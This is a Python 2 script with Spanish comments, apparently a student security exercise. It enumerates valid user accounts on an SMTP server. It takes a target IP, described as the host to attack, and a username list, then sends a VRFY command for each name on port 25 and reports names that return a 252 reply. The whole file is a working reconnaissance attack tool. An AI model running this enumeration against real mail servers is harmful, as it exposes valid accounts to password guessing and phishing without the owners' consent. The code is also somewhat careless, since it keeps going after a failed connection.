#!/usr/bin/python

#############################################
######## Manzano Cruz Isaias Abraham ########
#############################################

import argparse
import socket

def opciones():
	'''
	Funcion que obtiene los argumentos de la linea de comandos
	Devuelve: Las opciones que se pasaron por linea de  comandos
	'''
	parser = argparse.ArgumentParser()
	parser.add_argument('-i','--ip', help='Selecciona la ip del host a atacar', type= unicode, default=None)
	parser.add_argument('-l','--lista', help='Selecciona el archivo de usuarios a probar', type=str, default=None)
	return parser.parse_args()

def verifica(args):
	'''
	Funcion que verifica que las opciones de entrada no sean nulas, en caso afirmativo, termina el programa con error
	Recibe: Los argumentos pasados por linea de comandos
	'''
	if args.ip == None:
		print 'Debes especificar la ip destino'
		exit(1)
	if args.lista == None:
		print 'Debes especificar el archivo de usuarios'
		exit(1)

def hace_peticiones(ip,users):
    '''
    Hace la conexión al servidor SMTP especificado
    Recibe:
            ip: la ip del host a conetarse
            users: un archivo con usuarios
    Devuelve: None
    '''
    names = []
    with open(users,'r') as fl_users:
        for user in fl_users:
            names.append(user.strip())
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        conn = s.connect((ip,25))
    except:
        print 'Conexion fallida'

    for user in names:
        s.send('VRFY ' + user + '\r\n')
        res = s.recv(1024).strip()
        if '220' in res:
            print res.replace('220','')
        if '252' in res:
            print 'Usuario [%s] encontrado'%user

def main():
	'''
	Funcion principal
	'''
	args = opciones()
	verifica(args)
	hace_peticiones(args.ip,args.lista)

main()
